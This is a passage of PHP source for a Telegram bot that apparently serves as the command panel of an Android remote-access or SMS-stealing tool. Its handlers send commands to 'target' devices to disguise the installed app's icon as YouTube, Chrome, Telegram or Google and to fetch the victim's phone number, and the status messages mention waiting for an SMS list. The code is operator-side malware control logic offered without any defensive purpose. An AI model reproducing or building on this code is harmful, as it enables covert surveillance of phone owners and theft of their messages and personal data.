        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤 ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡 ᴄᴏᴍᴍᴀɴᴅ: ᴄʜᴀɴɢᴇ ᴀᴘᴘ ɪᴄᴏɴ ᴛᴏ ʏᴏᴜᴛᴜʙᴇ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$chat_id/wait_msg_id.txt", $wait_msg->result->message_id);
    
    requests('changetogoogle', $device_id);


    } elseif (strpos($data, "chrome") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);

        requests('changetochrome', $device_id);
    } elseif (strpos($data, "telegram") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        requests('changetotel', $device_id);
    } elseif (strpos($data, "google") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        requests('changetogoogle', $device_id);
    } elseif (strpos($data, "youtube") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        requests('changetoyoutube', $device_id);
} elseif (strpos($data, "userphone") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    
    $request_time = getIranTime();
    
    // ارسال پیام انتظار و ذخیره message_id
    $wait_message = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ɴᴜᴍʙᴇʀ ᴜꜱᴇʀ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    // ذخیره message_id برای استفاده بعدی
    $wait_message_id = $wait_message->result->message_id;
    file_put_contents("user/$device_id-userphone-wait.txt", "$chat_id|$wait_message_id");
    
    requests('userphone', $device_id);
}
}
?>

